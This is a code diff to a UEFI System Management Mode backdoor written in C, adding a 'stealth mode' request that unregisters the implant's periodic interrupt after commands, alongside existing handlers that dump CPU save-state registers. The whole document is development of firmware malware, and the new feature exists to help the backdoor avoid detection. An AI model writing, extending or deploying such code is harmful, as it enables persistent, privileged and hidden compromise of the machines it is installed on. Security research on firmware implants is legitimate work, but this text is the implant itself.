@@ -41,6 +41,8 @@ static const UINT64 BACKDOOR_CALL_REGISTERS[] = {
     EFI_SMM_SAVE_STATE_REGISTER_R9
 };
 
+static BOOLEAN gStealthMode = FALSE;
+
 struct ControlRegs gControlRegs; 
 
 static EFI_STATUS register_periodic_interrupt();
@@ -106,6 +108,10 @@ static void backdoor_api_dump_register(struct BackdoorParams* params, UINT32 cpu
     params->r[0] = gSmmCpu->ReadSaveState(gSmmCpu, sizeof(params->r[1]), params->r[1], cpu, &params->r[1]);
 }
 
+static void backdoor_api_set_mode(struct BackdoorParams* params) {
+    gStealthMode = (params->r[1] == BACKDOOR_STEALTH_MODE);
+}
+
 static BOOLEAN handle_cpu_core(UINT32 cpu) {
     struct BackdoorParams params;
     backdoor_read_params(&params, cpu);
@@ -116,10 +122,6 @@ static BOOLEAN handle_cpu_core(UINT32 cpu) {
         switch (request) {
             case BACKDOOR_HELLO_WORLD_TEST:
                 backdoor_api_hello_world_test(&params);
-                break;
-
-            case BACKDOOR_WAKEUP:
-                backdoor_api_wakeup(&params);
                 break;
 
             case BACKDOOR_GET_CURRENT_CPU:
@@ -134,9 +136,20 @@ static BOOLEAN handle_cpu_core(UINT32 cpu) {
                 backdoor_api_dump_register(&params, cpu);
                 break;
 
+            case BACKDOOR_SET_MODE:
+                backdoor_api_set_mode(&params);
+                break;
+
+            case BACKDOOR_WAKEUP:
+                backdoor_api_wakeup(&params);
+                break;
         }
 
         backdoor_write_params(&params, cpu);
+
+        if (gStealthMode && request != BACKDOOR_WAKEUP)
+            unregister_periodic_interrupt();
+
         return TRUE;
     }
 
